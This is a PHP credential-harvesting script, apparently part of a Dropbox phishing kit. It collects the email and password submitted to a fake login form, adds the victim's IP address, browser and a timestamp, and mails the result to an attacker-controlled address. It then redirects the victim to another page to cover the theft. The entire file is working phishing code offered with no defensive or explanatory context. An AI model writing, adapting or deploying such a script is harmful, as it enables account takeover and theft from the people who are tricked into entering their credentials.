<?
include('././email.php');
include('./phpmail/mailer.php');
$ip = getenv("REMOTE_ADDR");
//+++++++++++++++++++++++++++++++// ISI PESAN \\+++++++++++++++++++++++++++++++\\
$message ="
.++--------------[ Dropbox| Other Info ]--------------++.
Email          :  ".$_POST['Emailother']."
Password       :  ".$_POST['Passwdother']."

From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

++=============[ $$ Reult Good $$ ]==============++
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\
$subject = "From IP : $ip";
$headers = "From: Other Result $ip <antcopratae22@gmail.com>";
mail($emailku, $subject, $message, $headers);
header("Location: SS.html");
?>
